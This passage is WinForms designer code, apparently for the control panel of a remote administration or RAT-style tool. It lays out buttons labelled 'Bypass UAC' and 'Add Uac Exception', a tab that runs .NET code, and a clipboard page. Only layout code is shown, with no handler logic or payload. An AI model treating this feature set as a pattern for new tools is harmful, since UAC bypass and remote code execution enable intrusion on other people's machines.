        this.StateAdmin.Click += new System.EventHandler(StateAdmin_Click);
        this.guna2GradientButton_2.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.guna2GradientButton_2.BackColor = System.Drawing.Color.White;
        this.guna2GradientButton_2.BorderRadius = 4;
        this.guna2GradientButton_2.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.guna2GradientButton_2.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.guna2GradientButton_2.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.guna2GradientButton_2.CheckedState.Parent = this.guna2GradientButton_2;
        this.guna2GradientButton_2.Cursor = System.Windows.Forms.Cursors.Hand;
        this.guna2GradientButton_2.CustomImages.Parent = this.guna2GradientButton_2;
        this.guna2GradientButton_2.Enabled = false;
        this.guna2GradientButton_2.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.guna2GradientButton_2.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.guna2GradientButton_2.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.guna2GradientButton_2.ForeColor = System.Drawing.Color.White;
        this.guna2GradientButton_2.HoverState.Parent = this.guna2GradientButton_2;
        this.guna2GradientButton_2.Location = new System.Drawing.Point(557, 378);
        this.guna2GradientButton_2.Name = "ExcuteUAC";
        this.guna2GradientButton_2.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.guna2GradientButton_2.PressedDepth = 50;
        this.guna2GradientButton_2.ShadowDecoration.Parent = this.guna2GradientButton_2;
        this.guna2GradientButton_2.Size = new System.Drawing.Size(170, 26);
        this.guna2GradientButton_2.TabIndex = 710;
        this.guna2GradientButton_2.Text = " Excute UAC Exception";
        this.guna2GradientButton_2.Click += new System.EventHandler(ExcuteUAC_Click);
        this.guna2GradientButton_3.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.guna2GradientButton_3.BackColor = System.Drawing.Color.White;
        this.guna2GradientButton_3.BorderRadius = 4;
        this.guna2GradientButton_3.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.guna2GradientButton_3.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.guna2GradientButton_3.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.guna2GradientButton_3.CheckedState.Parent = this.guna2GradientButton_3;
        this.guna2GradientButton_3.Cursor = System.Windows.Forms.Cursors.Hand;
        this.guna2GradientButton_3.CustomImages.Parent = this.guna2GradientButton_3;
        this.guna2GradientButton_3.Enabled = false;
        this.guna2GradientButton_3.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.guna2GradientButton_3.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.guna2GradientButton_3.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.guna2GradientButton_3.ForeColor = System.Drawing.Color.White;
        this.guna2GradientButton_3.HoverState.Parent = this.guna2GradientButton_3;
        this.guna2GradientButton_3.Location = new System.Drawing.Point(620, 12);
        this.guna2GradientButton_3.Name = "BypassUAC";
        this.guna2GradientButton_3.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.guna2GradientButton_3.PressedDepth = 50;
        this.guna2GradientButton_3.ShadowDecoration.Parent = this.guna2GradientButton_3;
        this.guna2GradientButton_3.Size = new System.Drawing.Size(107, 26);
        this.guna2GradientButton_3.TabIndex = 709;
        this.guna2GradientButton_3.Text = "Bypass UAC";
        this.guna2GradientButton_3.Click += new System.EventHandler(BypassUAC_Click);
        this.AddUAC.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.AddUAC.BackColor = System.Drawing.Color.White;
        this.AddUAC.BorderRadius = 4;
        this.AddUAC.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.AddUAC.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.AddUAC.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.AddUAC.CheckedState.Parent = this.AddUAC;
        this.AddUAC.Cursor = System.Windows.Forms.Cursors.Hand;
        this.AddUAC.CustomImages.Parent = this.AddUAC;
        this.AddUAC.Enabled = false;
        this.AddUAC.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.AddUAC.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.AddUAC.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.AddUAC.ForeColor = System.Drawing.Color.White;
        this.AddUAC.HoverState.Parent = this.AddUAC;
        this.AddUAC.Location = new System.Drawing.Point(288, 12);
        this.AddUAC.Name = "AddUAC";
        this.AddUAC.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.AddUAC.PressedDepth = 50;
        this.AddUAC.ShadowDecoration.Parent = this.AddUAC;
        this.AddUAC.Size = new System.Drawing.Size(170, 26);
        this.AddUAC.TabIndex = 708;
        this.AddUAC.Text = "Add Uac Exception";
        this.AddUAC.Click += new System.EventHandler(AddUAC_Click);
        this.RunAsadminstartor.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.RunAsadminstartor.BackColor = System.Drawing.Color.White;
        this.RunAsadminstartor.BorderRadius = 4;
        this.RunAsadminstartor.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.RunAsadminstartor.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.RunAsadminstartor.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.RunAsadminstartor.CheckedState.Parent = this.RunAsadminstartor;
        this.RunAsadminstartor.Cursor = System.Windows.Forms.Cursors.Hand;
        this.RunAsadminstartor.CustomImages.Parent = this.RunAsadminstartor;
        this.RunAsadminstartor.Enabled = false;
        this.RunAsadminstartor.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.RunAsadminstartor.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.RunAsadminstartor.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.RunAsadminstartor.ForeColor = System.Drawing.Color.White;
        this.RunAsadminstartor.HoverState.Parent = this.RunAsadminstartor;
        this.RunAsadminstartor.Location = new System.Drawing.Point(464, 12);
        this.RunAsadminstartor.Name = "RunAsadminstartor";
        this.RunAsadminstartor.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.RunAsadminstartor.PressedDepth = 50;
        this.RunAsadminstartor.ShadowDecoration.Parent = this.RunAsadminstartor;
        this.RunAsadminstartor.Size = new System.Drawing.Size(150, 26);
        this.RunAsadminstartor.TabIndex = 707;
        this.RunAsadminstartor.Text = "Run as adminstartor";
        this.RunAsadminstartor.Click += new System.EventHandler(RunAsadminstartor_Click);
        this.bunifuLabel3.AllowParentOverrides = false;
        this.bunifuLabel3.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.bunifuLabel3.AutoEllipsis = false;
        this.bunifuLabel3.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel3.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel3.Font = new System.Drawing.Font("Segoe UI Semibold", 9.75f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.bunifuLabel3.ForeColor = System.Drawing.Color.Black;
        this.bunifuLabel3.Location = new System.Drawing.Point(158, 99);
        this.bunifuLabel3.Name = "bunifuLabel3";
        this.bunifuLabel3.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel3.Size = new System.Drawing.Size(47, 17);
        this.bunifuLabel3.TabIndex = 574;
        this.bunifuLabel3.Text = "Admin :";
        this.bunifuLabel3.TextAlignment = System.Drawing.ContentAlignment.TopLeft;
        this.bunifuLabel3.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.InfoAdmin.AllowParentOverrides = false;
        this.InfoAdmin.Anchor = System.Windows.Forms.AnchorStyles.None;
        this.InfoAdmin.AutoEllipsis = false;
        this.InfoAdmin.AutoSize = false;
        this.InfoAdmin.Cursor = System.Windows.Forms.Cursors.Default;
        this.InfoAdmin.CursorType = System.Windows.Forms.Cursors.Default;
        this.InfoAdmin.Font = new System.Drawing.Font("Segoe UI Black", 72f, System.Drawing.FontStyle.Bold);
        this.InfoAdmin.ForeColor = System.Drawing.Color.FromArgb(0, 192, 0);
        this.InfoAdmin.Location = new System.Drawing.Point(3, 122);
        this.InfoAdmin.Name = "InfoAdmin";
        this.InfoAdmin.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.InfoAdmin.Size = new System.Drawing.Size(735, 136);
        this.InfoAdmin.TabIndex = 573;
        this.InfoAdmin.Text = "...";
        this.InfoAdmin.TextAlignment = System.Drawing.ContentAlignment.MiddleCenter;
        this.InfoAdmin.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.tabPage_0.Controls.Add(this.PanelMune);
        this.tabPage_0.Controls.Add(this.toolStrip1);
        this.tabPage_0.Controls.Add(this.TopTols);
        this.tabPage_0.Controls.Add(this.RixhTextBoxNET);
        this.tabPage_0.Location = new System.Drawing.Point(4, 4);
        this.tabPage_0.Name = "PageDotNET";
        this.tabPage_0.Size = new System.Drawing.Size(741, 416);
        this.tabPage_0.TabIndex = 2;
        this.tabPage_0.Text = "PageDotNET";
        this.tabPage_0.UseVisualStyleBackColor = true;
        this.PanelMune.Controls.Add(this.TextReferences);
        this.PanelMune.Controls.Add(this.ListReferences);
        this.PanelMune.Controls.Add(this.MuneClose);
        this.PanelMune.Controls.Add(this.bunifuLabel17);
        this.PanelMune.Controls.Add(this.OKReferences);
        this.PanelMune.Dock = System.Windows.Forms.DockStyle.Right;
        this.PanelMune.Location = new System.Drawing.Point(506, 25);
        this.PanelMune.Name = "PanelMune";
        this.PanelMune.Size = new System.Drawing.Size(235, 366);
        this.PanelMune.TabIndex = 610;
        this.PanelMune.Visible = false;
        this.TextReferences.AcceptsReturn = false;
        this.TextReferences.AcceptsTab = false;
        this.TextReferences.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.TextReferences.AnimationSpeed = 200;
        this.TextReferences.AutoCompleteMode = System.Windows.Forms.AutoCompleteMode.None;
        this.TextReferences.AutoCompleteSource = System.Windows.Forms.AutoCompleteSource.None;
        this.TextReferences.AutoSizeHeight = true;
        this.TextReferences.BackColor = System.Drawing.Color.Transparent;
        this.TextReferences.BackgroundImage = (System.Drawing.Image)resources.GetObject("TextReferences.BackgroundImage");
        this.TextReferences.BorderColorActive = System.Drawing.Color.FromArgb(87, 59, 255);
        this.TextReferences.BorderColorDisabled = System.Drawing.Color.FromArgb(204, 204, 204);
        this.TextReferences.BorderColorHover = System.Drawing.Color.FromArgb(255, 192, 128);
        this.TextReferences.BorderColorIdle = System.Drawing.Color.Silver;
        this.TextReferences.BorderRadius = 2;
        this.TextReferences.BorderThickness = 1;
        this.TextReferences.CharacterCasing = System.Windows.Forms.CharacterCasing.Normal;
        this.TextReferences.Cursor = System.Windows.Forms.Cursors.IBeam;
        this.TextReferences.DefaultFont = new System.Drawing.Font("Segoe UI", 9.25f);
        this.TextReferences.DefaultText = "";
        this.TextReferences.FillColor = System.Drawing.Color.White;
        this.TextReferences.HideSelection = true;
        this.TextReferences.IconLeft = null;
        this.TextReferences.IconLeftCursor = System.Windows.Forms.Cursors.IBeam;
        this.TextReferences.IconPadding = 3;
        this.TextReferences.IconRight = Properties.Resources.IconAdd;
        this.TextReferences.IconRightCursor = System.Windows.Forms.Cursors.Hand;
        this.TextReferences.Lines = new string[0];
        this.TextReferences.Location = new System.Drawing.Point(3, 283);
        this.TextReferences.MaxLength = 32767;
        this.TextReferences.MinimumSize = new System.Drawing.Size(1, 1);
        this.TextReferences.Modified = false;
        this.TextReferences.Multiline = false;
        this.TextReferences.Name = "TextReferences";
        stateProperties.BorderColor = System.Drawing.Color.FromArgb(87, 59, 255);
        stateProperties.FillColor = System.Drawing.Color.Empty;
        stateProperties.ForeColor = System.Drawing.Color.Empty;
        stateProperties.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextReferences.OnActiveState = stateProperties;
        stateProperties2.BorderColor = System.Drawing.Color.FromArgb(204, 204, 204);
        stateProperties2.FillColor = System.Drawing.Color.FromArgb(240, 240, 240);
        stateProperties2.ForeColor = System.Drawing.Color.FromArgb(109, 109, 109);
        stateProperties2.PlaceholderForeColor = System.Drawing.Color.DarkGray;
        this.TextReferences.OnDisabledState = stateProperties2;
        stateProperties3.BorderColor = System.Drawing.Color.FromArgb(255, 192, 128);
        stateProperties3.FillColor = System.Drawing.Color.Empty;
        stateProperties3.ForeColor = System.Drawing.Color.Empty;
        stateProperties3.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextReferences.OnHoverState = stateProperties3;
        stateProperties4.BorderColor = System.Drawing.Color.Silver;
        stateProperties4.FillColor = System.Drawing.Color.White;
        stateProperties4.ForeColor = System.Drawing.Color.Empty;
        stateProperties4.PlaceholderForeColor = System.Drawing.Color.Empty;
        this.TextReferences.OnIdleState = stateProperties4;
        this.TextReferences.Padding = new System.Windows.Forms.Padding(3);
        this.TextReferences.PasswordChar = '\0';
        this.TextReferences.PlaceholderForeColor = System.Drawing.Color.Silver;
        this.TextReferences.PlaceholderText = "Library name";
        this.TextReferences.ReadOnly = false;
        this.TextReferences.ScrollBars = System.Windows.Forms.ScrollBars.None;
        this.TextReferences.SelectedText = "";
        this.TextReferences.SelectionLength = 0;
        this.TextReferences.SelectionStart = 0;
        this.TextReferences.ShortcutsEnabled = true;
        this.TextReferences.Size = new System.Drawing.Size(229, 28);
        this.TextReferences.Style = Bunifu.UI.WinForms.BunifuTextBox._Style.Bunifu;
        this.TextReferences.TabIndex = 682;
        this.TextReferences.TextAlign = System.Windows.Forms.HorizontalAlignment.Center;
        this.TextReferences.TextMarginBottom = 0;
        this.TextReferences.TextMarginLeft = 3;
        this.TextReferences.TextMarginTop = 1;
        this.TextReferences.TextPlaceholder = "Library name";
        this.TextReferences.UseSystemPasswordChar = false;
        this.TextReferences.WordWrap = true;
        this.TextReferences.OnIconRightClick += new System.EventHandler(TextReferences_OnIconRightClick);
        this.ListReferences.AllowUserToAddRows = false;
        this.ListReferences.AllowUserToDeleteRows = false;
        this.ListReferences.AllowUserToResizeColumns = false;
        this.ListReferences.AllowUserToResizeRows = false;
        dataGridViewCellStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListReferences.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
        this.ListReferences.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.ListReferences.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.AllCells;
        this.ListReferences.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
        this.ListReferences.BackgroundColor = System.Drawing.Color.White;
        this.ListReferences.BorderStyle = System.Windows.Forms.BorderStyle.None;
        this.ListReferences.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListReferences.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.Disable;
        this.ListReferences.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle2.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle2.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle2.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle2.SelectionBackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        dataGridViewCellStyle2.SelectionForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
        this.ListReferences.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
        this.ListReferences.ColumnHeadersHeight = 30;
        this.ListReferences.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListReferences.Columns.AddRange(this.Column1, this.Column2);
        this.ListReferences.ContextMenuStrip = this.ContectRefrences;
        dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
        dataGridViewCellStyle3.BackColor = System.Drawing.Color.White;
        dataGridViewCellStyle3.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        dataGridViewCellStyle3.ForeColor = System.Drawing.Color.Black;
        dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.White;
        dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
        this.ListReferences.DefaultCellStyle = dataGridViewCellStyle3;
        this.ListReferences.EnableHeadersVisualStyles = false;
        this.ListReferences.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListReferences.Location = new System.Drawing.Point(3, 43);
        this.ListReferences.Name = "ListReferences";
        this.ListReferences.RowHeadersVisible = false;
        this.ListReferences.RowHeadersWidth = 27;
        this.ListReferences.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
        this.ListReferences.ShowCellErrors = false;
        this.ListReferences.ShowEditingIcon = false;
        this.ListReferences.ShowRowErrors = false;
        this.ListReferences.Size = new System.Drawing.Size(229, 234);
        this.ListReferences.TabIndex = 658;
        this.ListReferences.Theme = Guna.UI2.WinForms.Enums.DataGridViewPresetThemes.Light;
        this.ListReferences.ThemeStyle.AlternatingRowsStyle.BackColor = System.Drawing.Color.FromArgb(247, 248, 249);
        this.ListReferences.ThemeStyle.AlternatingRowsStyle.Font = null;
        this.ListReferences.ThemeStyle.AlternatingRowsStyle.ForeColor = System.Drawing.Color.Empty;
        this.ListReferences.ThemeStyle.AlternatingRowsStyle.SelectionBackColor = System.Drawing.Color.Empty;
        this.ListReferences.ThemeStyle.AlternatingRowsStyle.SelectionForeColor = System.Drawing.Color.Empty;
        this.ListReferences.ThemeStyle.BackColor = System.Drawing.Color.White;
        this.ListReferences.ThemeStyle.GridColor = System.Drawing.Color.FromArgb(244, 245, 247);
        this.ListReferences.ThemeStyle.HeaderStyle.BackColor = System.Drawing.Color.FromArgb(232, 234, 237);
        this.ListReferences.ThemeStyle.HeaderStyle.BorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
        this.ListReferences.ThemeStyle.HeaderStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListReferences.ThemeStyle.HeaderStyle.ForeColor = System.Drawing.Color.Black;
        this.ListReferences.ThemeStyle.HeaderStyle.HeaightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
        this.ListReferences.ThemeStyle.HeaderStyle.Height = 30;
        this.ListReferences.ThemeStyle.ReadOnly = false;
        this.ListReferences.ThemeStyle.RowsStyle.BackColor = System.Drawing.Color.White;
        this.ListReferences.ThemeStyle.RowsStyle.BorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
        this.ListReferences.ThemeStyle.RowsStyle.Font = new System.Drawing.Font("Segoe UI", 10.5f);
        this.ListReferences.ThemeStyle.RowsStyle.ForeColor = System.Drawing.Color.Black;
        this.ListReferences.ThemeStyle.RowsStyle.Height = 22;
        this.ListReferences.ThemeStyle.RowsStyle.SelectionBackColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.ListReferences.ThemeStyle.RowsStyle.SelectionForeColor = System.Drawing.Color.White;
        this.Column1.HeaderText = "";
        this.Column1.Name = "Column1";
        this.Column1.Width = 5;
        this.Column2.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.Fill;
        this.Column2.HeaderText = "References";
        this.Column2.Name = "Column2";
        this.ContectRefrences.ImageScalingSize = new System.Drawing.Size(20, 20);
        this.ContectRefrences.Items.AddRange(new System.Windows.Forms.ToolStripItem[1] { this.DeleteRefrences });
        this.ContectRefrences.Name = "contextMenuStrip1";
        this.ContectRefrences.Size = new System.Drawing.Size(112, 30);
        this.DeleteRefrences.BackColor = System.Drawing.Color.White;
        this.DeleteRefrences.Image = (System.Drawing.Image)resources.GetObject("DeleteRefrences.Image");
        this.DeleteRefrences.Name = "DeleteRefrences";
        this.DeleteRefrences.Size = new System.Drawing.Size(111, 26);
        this.DeleteRefrences.Text = "Delete";
        this.DeleteRefrences.Click += new System.EventHandler(DeleteRefrences_Click);
        this.MuneClose.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right;
        this.MuneClose.AutoSize = true;
        this.MuneClose.Cursor = System.Windows.Forms.Cursors.Hand;
        this.MuneClose.Font = new System.Drawing.Font("Microsoft Sans Serif", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.MuneClose.Location = new System.Drawing.Point(214, 5);
        this.MuneClose.Name = "MuneClose";
        this.MuneClose.Size = new System.Drawing.Size(16, 15);
        this.MuneClose.TabIndex = 598;
        this.MuneClose.Text = "X";
        this.MuneClose.Click += new System.EventHandler(MuneClose_Click);
        this.bunifuLabel17.AllowParentOverrides = false;
        this.bunifuLabel17.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.bunifuLabel17.AutoEllipsis = false;
        this.bunifuLabel17.AutoSize = false;
        this.bunifuLabel17.BackColor = System.Drawing.Color.White;
        this.bunifuLabel17.Cursor = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel17.CursorType = System.Windows.Forms.Cursors.Default;
        this.bunifuLabel17.Font = new System.Drawing.Font("Segoe UI", 9f);
        this.bunifuLabel17.ForeColor = System.Drawing.Color.Gray;
        this.bunifuLabel17.Location = new System.Drawing.Point(40, 5);
        this.bunifuLabel17.Name = "bunifuLabel17";
        this.bunifuLabel17.RightToLeft = System.Windows.Forms.RightToLeft.No;
        this.bunifuLabel17.Size = new System.Drawing.Size(161, 15);
        this.bunifuLabel17.TabIndex = 615;
        this.bunifuLabel17.Text = "References";
        this.bunifuLabel17.TextAlignment = System.Drawing.ContentAlignment.TopCenter;
        this.bunifuLabel17.TextFormat = Bunifu.UI.WinForms.BunifuLabel.TextFormattingOptions.Default;
        this.OKReferences.Anchor = System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Right;
        this.OKReferences.BackColor = System.Drawing.Color.White;
        this.OKReferences.BorderRadius = 4;
        this.OKReferences.CheckedState.BorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.OKReferences.CheckedState.CustomBorderColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.OKReferences.CheckedState.FillColor = System.Drawing.Color.FromArgb(255, 159, 67);
        this.OKReferences.CheckedState.Parent = this.OKReferences;
        this.OKReferences.Cursor = System.Windows.Forms.Cursors.Hand;
        this.OKReferences.CustomImages.Parent = this.OKReferences;
        this.OKReferences.FillColor = System.Drawing.Color.FromArgb(87, 59, 255);
        this.OKReferences.FillColor2 = System.Drawing.Color.FromArgb(87, 59, 255);
        this.OKReferences.Font = new System.Drawing.Font("Consolas", 9.25f, System.Drawing.FontStyle.Bold);
        this.OKReferences.ForeColor = System.Drawing.Color.White;
        this.OKReferences.HoverState.Parent = this.OKReferences;
        this.OKReferences.Location = new System.Drawing.Point(153, 327);
        this.OKReferences.Name = "OKReferences";
        this.OKReferences.PressedColor = System.Drawing.Color.FromArgb(192, 0, 192);
        this.OKReferences.PressedDepth = 50;
        this.OKReferences.ShadowDecoration.Parent = this.OKReferences;
        this.OKReferences.Size = new System.Drawing.Size(76, 29);
        this.OKReferences.TabIndex = 574;
        this.OKReferences.Text = "OK";
        this.OKReferences.Click += new System.EventHandler(OKReferences_Click);
        this.toolStrip1.Dock = System.Windows.Forms.DockStyle.Bottom;
        this.toolStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
        this.toolStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[2] { this.toolStripSeparator1, this.LogsNET });
        this.toolStrip1.Location = new System.Drawing.Point(0, 391);
        this.toolStrip1.Name = "toolStrip1";
        this.toolStrip1.Size = new System.Drawing.Size(741, 25);
        this.toolStrip1.TabIndex = 6;
        this.toolStrip1.Text = "toolStrip2";
        this.toolStripSeparator1.Name = "toolStripSeparator1";
        this.toolStripSeparator1.Size = new System.Drawing.Size(6, 25);
        this.LogsNET.Name = "LogsNET";
        this.LogsNET.Size = new System.Drawing.Size(16, 22);
        this.LogsNET.Text = "...";
        this.LogsNET.Click += new System.EventHandler(LogsNET_Click);
        this.TopTols.ImageScalingSize = new System.Drawing.Size(24, 24);
        this.TopTols.Items.AddRange(new System.Windows.Forms.ToolStripItem[8] { this.toolStripSeparator9, this.NETTest, this.toolStripSeparator8, this.toolStripButton_0, this.toolStripSeparator2, this.toolStripLabel3, this.ComboxLanguages, this.ReferencesMune });
        this.TopTols.Location = new System.Drawing.Point(0, 0);
        this.TopTols.Name = "TopTols";
        this.TopTols.Size = new System.Drawing.Size(741, 25);
        this.TopTols.TabIndex = 5;
        this.TopTols.Text = "toolStrip2";
        this.toolStripSeparator9.Name = "toolStripSeparator9";
        this.toolStripSeparator9.Size = new System.Drawing.Size(6, 25);
        this.NETTest.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.NETTest.Image = (System.Drawing.Image)resources.GetObject("NETTest.Image");
        this.NETTest.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.NETTest.Name = "NETTest";
        this.NETTest.Size = new System.Drawing.Size(40, 22);
        this.NETTest.Text = "Test   ";
        this.NETTest.Click += new System.EventHandler(NETTest_Click);
        this.toolStripSeparator8.Name = "toolStripSeparator8";
        this.toolStripSeparator8.Size = new System.Drawing.Size(6, 25);
        this.toolStripButton_0.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.toolStripButton_0.Image = (System.Drawing.Image)resources.GetObject("NETExcute.Image");
        this.toolStripButton_0.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.toolStripButton_0.Name = "NETExcute";
        this.toolStripButton_0.Size = new System.Drawing.Size(55, 22);
        this.toolStripButton_0.Text = "Excute   ";
        this.toolStripButton_0.Click += new System.EventHandler(NETExcute_Click);
        this.toolStripSeparator2.Name = "toolStripSeparator2";
        this.toolStripSeparator2.Size = new System.Drawing.Size(6, 25);
        this.toolStripLabel3.Name = "toolStripLabel3";
        this.toolStripLabel3.Size = new System.Drawing.Size(91, 22);
        this.toolStripLabel3.Text = "       Languages :";
        this.ComboxLanguages.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
        this.ComboxLanguages.Items.AddRange(new object[2] { "C#", "VB.NET" });
        this.ComboxLanguages.Name = "ComboxLanguages";
        this.ComboxLanguages.Size = new System.Drawing.Size(121, 25);
        this.ComboxLanguages.SelectedIndexChanged += new System.EventHandler(ComboxLanguages_SelectedIndexChanged);
        this.ReferencesMune.Alignment = System.Windows.Forms.ToolStripItemAlignment.Right;
        this.ReferencesMune.DisplayStyle = System.Windows.Forms.ToolStripItemDisplayStyle.Text;
        this.ReferencesMune.Image = (System.Drawing.Image)resources.GetObject("ReferencesMune.Image");
        this.ReferencesMune.ImageTransparentColor = System.Drawing.Color.Magenta;
        this.ReferencesMune.Name = "ReferencesMune";
        this.ReferencesMune.Size = new System.Drawing.Size(86, 22);
        this.ReferencesMune.Text = "References      ";
        this.ReferencesMune.Click += new System.EventHandler(ReferencesMune_Click);
        this.RixhTextBoxNET.Anchor = System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left | System.Windows.Forms.AnchorStyles.Right;
        this.RixhTextBoxNET.BackColor = System.Drawing.Color.FromArgb(240, 240, 240);
        this.RixhTextBoxNET.Font = new System.Drawing.Font("Segoe UI", 9f, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, 0);
        this.RixhTextBoxNET.Location = new System.Drawing.Point(3, 28);
        this.RixhTextBoxNET.Name = "RixhTextBoxNET";
        this.RixhTextBoxNET.Size = new System.Drawing.Size(738, 360);
        this.RixhTextBoxNET.TabIndex = 4;
        this.RixhTextBoxNET.Tag = "";
        this.RixhTextBoxNET.Text = "";
        this.PageClipboard.Controls.Add(this.toolStrip2);
        this.PageClipboard.Controls.Add(this.richTextBoxClipboard);
        this.PageClipboard.Location = new System.Drawing.Point(4, 4);
        this.PageClipboard.Name = "PageClipboard";
        this.PageClipboard.Size = new System.Drawing.Size(741, 416);
        this.PageClipboard.TabIndex = 3;
        this.PageClipboard.Text = "PageClipboard";
        this.PageClipboard.UseVisualStyleBackColor = true;
        this.toolStrip2.ImageScalingSize = new System.Drawing.Size(24, 24);
        this.toolStrip2.Items.AddRange(new System.Windows.Forms.ToolStripItem[4] { this.toolStripSeparator3, this.ClipCopy, this.ClipPaste, this.ClipClear });
        this.toolStrip2.Location = new System.Drawing.Point(0, 0);
        this.toolStrip2.Name = "toolStrip2";
        this.toolStrip2.Size = new System.Drawing.Size(741, 25);
        this.toolStrip2.TabIndex = 7;
        this.toolStrip2.Text = "toolStrip2";
